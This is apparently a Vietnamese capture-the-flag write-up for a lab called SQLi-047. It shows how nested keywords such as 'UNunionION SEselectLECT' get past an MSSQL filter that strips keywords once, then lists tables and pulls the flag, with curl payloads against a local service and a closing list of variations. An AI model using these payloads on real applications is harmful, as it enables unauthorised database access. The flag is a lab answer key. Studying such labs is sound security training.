# SQLi-047: MSSQL Double Keyword Bypass - Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** Double Keyword `UNunionION SEselectLECT`  
**DBMS:** MSSQL  
**Flag:** `FLAG{mssql_d0ubl3_k3yw0rd_byp4ss}`

---

## 🔍 Bước 1: DETECT

```bash
# Test bình thường
curl "http://localhost:5047/employee?id=1"

# Test UNION SELECT - quan sát response
curl "http://localhost:5047/employee?id=1 UNION SELECT 1,2,3,4"
# → Không error nhưng cũng không work - keywords bị xóa!
```

### Phân tích WAF behavior

```bash
# Input: "1 UNION SELECT 1,2,3,4"
# WAF output: "1   1,2,3,4" (UNION và SELECT bị xóa)
```

---

## 🎯 Bước 2: BYPASS

### Double keyword technique

```bash
# UNunionION → sau khi xóa "union" → UNION
# SEselectLECT → sau khi xóa "select" → SELECT

curl "http://localhost:5047/employee?id=0 UNunionION SEselectLECT 1,2,3,4--"
# → Bypass thành công!
```

---

## 🔢 Bước 3: ENUMERATE

```bash
# List tables (MSSQL)
curl "http://localhost:5047/employee?id=0 UNunionION SEselectLECT 1,name,3,4 FROM sys.tables--"
# → employees, admin_users, flags
```

---

## 🏆 Bước 4: EXFILTRATE

```bash
curl "http://localhost:5047/employee?id=0 UNunionION SEselectLECT 1,name,value,4 FROM flags--"
```

🎉 **FLAG:** `FLAG{mssql_d0ubl3_k3yw0rd_byp4ss}`

---

## 🔧 Variations

```sql
-- Triple nested (nếu WAF xóa 2 lần)
UNIunionON → UNION (sau 1 lần)
UNIuniunionONON → UNION (sau 2 lần)

-- Mix case
uNuNiOnIoN sEsElEcTlEcT
```

## ✅ Flag

```
FLAG{mssql_d0ubl3_k3yw0rd_byp4ss}
```
